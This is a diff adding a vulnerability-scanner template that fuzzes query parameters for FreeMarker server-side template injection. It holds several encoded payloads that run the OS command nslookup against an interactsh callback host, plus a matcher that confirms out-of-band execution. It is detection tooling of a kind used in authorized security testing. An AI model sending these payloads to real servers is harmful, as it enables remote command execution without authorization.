@@ -1,0 +1,38 @@
+http:
+- fuzzing:
+  - fuzz:
+    - '{{injection}}'
+    mode: single
+    part: query
+    type: postfix
+  matchers:
+  - condition: and
+    dsl:
+    - contains(interactsh_protocol,'dns')
+    - contains(interactsh_request,'srv')
+    name: request-matcher
+    type: dsl
+  payloads:
+    injection:
+    - '%3c%23assign%20rce%3d%22freemarker.template.utility.Execute%22%3fnew()%3e%20%0d%0a%24%7b%20rce(%22nslookup%20-type=SRV%20{{interactsh-url}}%22)%20%7d'
+    - '%3c%23assign%20rce%3d%22freemarker.template.utility.Execute%22%3fnew()%3e%20%0d%0a%24%7b%20rce(%22nslookup%20-type=SRV%20{{interactsh-url}}%22)%20%7d'
+    - '[#assign%20ex%20=%20%27freemarker.template.utility.Execute%27?new()]${%20ex(%22nslookup%20-type%3DSRV%20{{interactsh-url}}%22)}'
+    - ${%22freemarker.template.utility.Execute%22?new()(%22nslookup%20-type%3DSRV%20{{interactsh-url}}%22)}
+    - '#{%22freemarker.template.utility.Execute%22?new()(%22nslookup%20-type%3DSRV%20{{interactsh-url}}%22)}'
+    - '[=%22freemarker.template.utility.Execute%22?new()(%22nslookup%20-type%3DSRV%20{{interactsh-url}}%22)]'
+  pre-condition:
+  - dsl:
+    - method == "GET"
+    type: dsl
+id: freemarker-oob
+info:
+  author: 0xAwali,DhiyaneshDK,ritikchaddha
+  metadata:
+    verified: true
+  name: Freemarker 2.3.33 - Out of Band Template Injection
+  reference:
+  - https://mvnrepository.com/artifact/org.freemarker/freemarker
+  - https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756
+  - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Java.md#freemarker---code-execution
+  severity: high
+  tags: ssti,dast,oast,oob,vuln
